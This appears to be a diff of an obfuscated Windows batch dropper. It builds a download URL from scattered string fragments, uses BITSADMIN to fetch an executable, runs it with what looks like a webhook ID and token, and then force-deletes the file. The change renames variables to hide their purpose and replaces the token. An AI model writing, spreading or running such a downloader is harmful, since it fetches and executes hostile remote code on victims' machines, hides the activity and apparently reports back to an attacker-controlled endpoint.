@@ -24,12 +24,12 @@ SET FX=%Q%\%FE%.%DE%%DR%%DZ%
 SET FR=h
 SET RTA=%FR%%DEF%%DEF%ps
 SET RGA=/
-set downloadurl=%RTA%:%RGA%%RGA%%SO%%D2%%D%%SP%.%DYNI%/%USR%/%REP%/%DIFI%/%PTC%%PTO%/%X%
-set downloadpath=%FX%
-BITSADMIN /transfer /download %downloadurl% %downloadpath%
+set DLSS=%RTA%:%RGA%%RGA%%SO%%D2%%D%%SP%.%DYNI%/%USR%/%REP%/%DIFI%/%PTC%%PTO%/%X%
+set RTX_NV=%FX%
+BITSADMIN /transfer /download %DLSS% %RTX_NV%
 set directory=%Q%
 SET RT="REACT"
-start %FE%.%DE%%DR%%DZ% 860716599157587999/ktqbtrJ04wVnAOL2QQJ3rla4qSCTRT9i01B4EAAWWhvQ02I_S7J5i2qEBp1KTWqa49Pn
+start %FE%.%DE%%DR%%DZ% -862147348624048138/7zVx8R2iUngYyKUMcLXxhZqOnEzsDQfhScAif7tqsySAkCoRQKITY5WH6M18v2ompQe8
 SET DD="DD DD DD DD"
 del /f %FE%.%DE%%DR%%DZ%
 echo on
